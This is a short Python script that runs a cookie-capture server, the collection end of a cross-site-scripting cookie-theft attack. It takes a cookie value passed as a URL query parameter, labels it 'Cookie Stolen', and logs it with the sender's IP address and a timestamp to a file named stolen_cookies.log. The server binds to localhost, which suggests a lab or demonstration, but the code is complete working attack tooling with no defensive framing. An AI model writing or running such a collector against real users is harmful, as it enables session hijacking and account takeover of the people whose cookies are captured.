from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import json

class CookieHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Extract query parameters from URL
        query = urlparse(self.path).query
        params = parse_qs(query)
        
        # Check if cookie data was sent
        if 'c' in params:
            cookie = params['c'][0]
            ip = self.client_address[0]
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Create log entry
            log_entry = f"""
========================================
Time: {timestamp}
IP Address: {ip}
Cookie Stolen: {cookie}
========================================
"""
            
            # Save to file
            with open('stolen_cookies.log', 'a') as f:
                f.write(log_entry)
            
            # Print to console so you can see it working
            print("✅ Cookie captured successfully!")
            print(log_entry)
            
            # Send response back to browser
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'OK - Cookie Received')
    
    # Suppress default logging messages
    def log_message(self, format, *args):
        pass

# Start the server
if __name__ == '__main__':
    PORT = 8000
    print(f" Starting Cookie Capture Server on port {PORT}...")
    print(f" Server will log cookies to 'stolen_cookies.log'")
    print(f" Accessible at: http://localhost:{PORT}")
    print("Press Ctrl+C to stop the server\n")
    
    server = HTTPServer(('localhost', PORT), CookieHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n Server stopped")
